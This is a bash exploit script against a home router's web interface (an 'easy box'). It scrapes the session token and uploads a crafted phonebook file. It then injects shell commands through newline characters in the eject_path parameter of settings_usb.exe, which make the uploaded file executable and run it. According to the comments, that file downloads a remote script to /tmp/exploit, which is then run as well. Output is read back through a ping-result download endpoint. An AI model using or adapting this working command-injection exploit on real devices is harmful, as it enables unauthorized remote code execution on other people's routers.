#!/bin/bash
set -e

#set ip or hostname of your easy box
host=192.168.2.1

#function for injecting shell code through settings_usb.exe
inject () {
    echo trying to inject \"$code\" \($(echo $code | wc -c) chars\)
    curl -k --silent -X POST "$host/cgi-bin/login/settings_usb.exe" --data "httoken=$token&eject_path=$code" > /dev/null
}

#obtain token
echo trying to get token
token=$(curl -k --silent "$host" | grep -o "httoken='[0-9a-f]*'" | grep -o "[0-9a-f]\{16\}")
echo "token=$token"

#upload tweaked phonebook backup
echo trying to upload phonebook
curl -k -X POST --silent "$host/cgi-bin/login/upload_phonebook.exe" -F "httoken=$token" -F "phonebookUpload=@phonebook.txt" > /dev/null

#set executable flag for /tmp/phone_book.txt
code='
chmod 777 /tmp/phone_book.txt '
inject

#execute /tmp/phone_book.txt
#note that slash and minus characters are passed here
#remote_script.sh should be downloaded to /tmp/exploit
code='
/tmp/pho* / $'"'\055'"
inject

#set executable flag for /tmp/exploit
code='
chmod 777 /tmp/exploit'
inject

#execute /tmp/exploit
code='
/tmp/exploit '
inject

#there is an endpoint for executing ping requests. This function will execute the ping command and pipe output to /tmp/ping_result
#the endpoint status_dl_ping_result.exe will download the /tmp/ping_result file
#we can use this function to get output from the router
echo trying to download /tmp/ping_result
FILE=./cmd_result.txt
curl -k --silent "$host/cgi-bin/login/status_dl_ping_result.exe" --data "httoken=$token&is_dl=1" --output $FILE > /dev/null
if [ -f "$FILE" ]; then
    echo "Output from easy box:"
    cat $FILE
fi
